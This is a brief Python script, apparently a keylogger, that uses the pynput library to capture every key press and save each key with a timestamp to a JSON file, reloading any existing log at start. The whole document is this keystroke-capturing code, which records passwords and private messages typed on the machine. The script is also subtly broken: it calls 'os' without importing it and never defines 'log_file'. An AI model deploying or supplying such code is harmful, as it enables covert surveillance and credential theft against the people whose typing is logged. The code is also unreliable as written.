from pynput import keyboard
import time
import json

if os.path.exists(log_file):
    with open(log_file, "r") as f:
        try:
            keystrokes = json.load(f)
        except json.JSONDecodeError:
            # Create new file if corrupted and empty
            keystrokes = []
else:
    keystrokes = []

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)

        # Appending keystroke with timestamps
        keystrokes.append({"key": key_str, "timestamp": time.time()})

        # Saving the file (updated version)
        with open(log_file, "w") as f:
            json.dump(keystrokes, f, indent=4)

    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
